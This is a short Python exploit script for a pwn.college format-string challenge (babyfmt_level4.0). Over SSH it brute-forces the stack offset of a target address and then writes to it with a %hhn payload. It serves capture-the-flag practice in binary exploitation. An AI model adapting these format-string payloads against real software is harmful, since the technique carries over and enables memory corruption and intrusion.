import subprocess
import struct

ADDR = 0x404100
SSH_CMD = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.0",
]


def run_payload(fmt_bytes, pad):
    payload = fmt_bytes + b"B" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH_CMD, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return res.stdout.decode("latin-1", errors="ignore")


def find_index():
    tail = "%p " * 40
    base = f"AAA |%1$143c%{{idx}}${{conv}} DONE {tail}"
    MAX_IDX = 120
    pad_order = [3, 4, 5, 6, 7, 0, 1, 2]
    for pad in pad_order:
        for idx in range(1, MAX_IDX):
            fmt = base.format(idx=idx, conv="llx")
            out = run_payload(fmt.encode(), pad)
            marker = None
            for line in out.splitlines():
                if line.startswith("AAA "):
                    marker = line
                    break
            if marker and "#" in marker:
                value = marker.split("#", 1)[1].split()[0]
                if value.lower() == "404100":
                    print(f"[+] Found index {idx} with pad {pad}")
                    print(marker)
                    return idx, pad
    raise RuntimeError("Could not locate pointer index")


def write_value(idx, pad):
    tail = "%p " * 40
    fmt = f"AAA |%1$143c%{idx}$hhn DONE {tail}"
    out = run_payload(fmt.encode(), pad)
    print(out)


if __name__ == "__main__":
    target_idx, target_pad = find_index()
    write_value(target_idx, target_pad)
